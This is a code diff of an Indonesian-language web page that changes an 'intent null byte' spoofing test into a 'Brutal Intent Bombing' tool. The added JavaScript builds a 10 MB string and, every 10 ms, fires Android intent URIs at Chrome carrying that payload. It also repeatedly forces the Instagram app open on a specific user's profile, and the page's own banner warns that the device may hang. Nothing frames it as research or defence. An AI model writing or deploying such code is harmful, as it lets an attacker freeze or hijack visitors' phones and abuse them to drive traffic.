@@ -1,29 +1,32 @@
-]<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Instagram Intent Null Byte Bypass</title>
+<title>Brutal Intent Bombing</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
 .panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 600px; width: 100%; border: 1px solid #333; }
-h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
+h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; animation: pulse 0.5s infinite; }
 p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
-button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #0078d4; color: #fff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(0, 120, 212, 0.3); transition: background 0.2s; }
-button:hover { background: #005a9e; }
+button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #fff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
+button:hover { background: #b71c1c; }
 button:disabled { background: #555; }
 #status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
 .log { background: #000; color: #0f0; padding: 10px; border-radius: 6px; font-family: monospace; text-align: left; margin-top: 15px; height: 150px; overflow-y: auto; font-size: 12px; }
+.warning { background: #331111; color: #ff4444; padding: 10px; border-radius: 6px; margin-bottom: 20px; font-size: 13px; border: 1px solid #ff4444; }
+@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
 </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-    <h1>Instagram Intent Null Byte</h1>
-    <p>Menguji bypass Intent Spoofing menggunakan Null Byte Injection.</p>
+    <div class="warning">⚠️ PERINGATAN: Ini akan memicu Intent Bombing ke sistem. Perangkat Anda mungkin akan hang!</div>
+    <h1>Brutal Intent Bombing</h1>
+    <p>Menembakkan Intent dalam jumlah masif dengan payload berukuran besar.</p>
     
-    <button id="start-btn" type="button">Buka Profil Instagram</button>
+    <button id="start-btn" type="button">Mulai Intent Bombing</button>
     <div id="status" role="status">Sistem siap.</div>
     <div class="log" id="log">Log akan muncul di sini...</div>
 </div>
@@ -33,32 +36,56 @@ button:disabled { background: #555; }
     const statusDiv = document.getElementById("status");
     const logDiv = document.getElementById("log");
 
+    let isRunning = false;
+    let count = 0;
+
     function log(msg) {
         logDiv.innerHTML += "<br>> " + msg;
         console.log(msg);
     }
 
     startBtn.addEventListener("click", () => {
-        statusDiv.textContent = "Memicu Intent Instagram...";
-        log("Memicu Intent Instagram...");
+        if (isRunning) return;
+        isRunning = true;
+        startBtn.disabled = true;
+        
+        statusDiv.textContent = "Memulai Intent Bombing...";
+        statusDiv.style.color = "#ff4444";
+        log("Memulai Intent Bombing...");
 
-        try {
-            // PERBAIKAN: Deklarasi variabel instagramIntent
-            // Menggunakan Null Byte (%00) untuk Intent Spoofing
-            const instagramIntent = "intent://#Intent;action=android.intent.action.VIEW;S.huge_payload=[10MB_Teks_Acak];package=com.browser.korban;end";
+        // Membuat payload data besar (10MB string)
+        const hugeData = "A".repeat(10 * 1024 * 1024);
+
+        // Loop untuk menembak Intent secara beruntun
+        function fireIntent() {
+            if (!isRunning) return;
             
-            log("Payload: " + instagramIntent);
+            count++;
+            statusDiv.textContent = `Intent ke-${count} ditembakkan...`;
             
-            // Eksekusi navigasi
-            window.location.href = instagramIntent;
-            
-            statusDiv.textContent = "Intent dipicu. Cek apakah Instagram terbuka.";
-            statusDiv.style.color = "#4CAF50";
-        } catch (e) {
-            log("Gagal: " + e.message);
-            statusDiv.textContent = "Gagal: " + e.message;
-            statusDiv.style.color = "#f00";
+            try {
+                // Intent Bombing: Action VIEW + Data Besar
+                // Tujuannya untuk membuat Intent Resolver Android kewalahan
+                const intentBomb = `intent://#Intent;action=android.intent.action.VIEW;S.huge_payload=${hugeData};package=com.android.chrome;end`;
+                
+                // Tembak Intent
+                window.location.href = intentBomb;
+
+                // Tembak variasi lain (Buka Instagram bersamaan)
+                const instagramBomb = "intent://instagram.com/_u/theonly_w4gur1/#Intent;scheme=https;package=com.instagram.android;category=android.intent.category.BROWSABLE;end";
+                window.location.href = instagramBomb;
+
+                log(`[${count}] Intent ditembakkan.`);
+            } catch (e) {
+                log(`[${count}] Gagal: ${e.message}`);
+            }
+
+            // Loop secepat mungkin (setTimeout 10ms)
+            setTimeout(fireIntent, 10);
         }
+
+        // Mulai tembakan
+        fireIntent();
     });
 </script>
 </body>
